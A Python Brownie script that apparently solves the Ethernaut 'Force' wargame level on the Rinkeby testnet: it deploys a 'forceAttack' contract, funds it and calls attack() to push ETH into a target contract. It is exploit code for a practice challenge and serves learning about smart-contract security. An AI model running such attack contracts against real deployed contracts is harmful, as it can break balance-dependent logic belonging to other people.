from multiprocessing.connection import wait
from brownie import *
from brownie.network.state import Chain
from web3 import Web3

import time
import json
import os

# get the default priority fee and multiply by 5 to ensure the tx is executed rapidly
priority_fee=chain.priority_fee*5

# attacker=accounts[0]
acct_pwd=os.getenv("ACCT_PWD")
attacker=accounts.load('ethernaut_rinkeby', acct_pwd)

target_address='0x144FC29e8b338E5898A530998B45ecE59DF05337'
target_ct=interface.Force(target_address)

# deploy attacker contract
attacker_contract=forceAttack.deploy(target_address, {'from': attacker, 'priority_fee': priority_fee})

def main():

    print('attacker_contract:', attacker_contract)
    # send some ETH to the attacker contract
    attacker.transfer(attacker_contract.address, amount=1, priority_fee=priority_fee)
    print('attacker_contract balance: ', attacker_contract.balance())
    tx=attacker_contract.attack({'from': attacker, 'priority_fee': priority_fee, 'gas_limit': 1000000})
    print('target_ct balance: ', target_ct.balance())
   
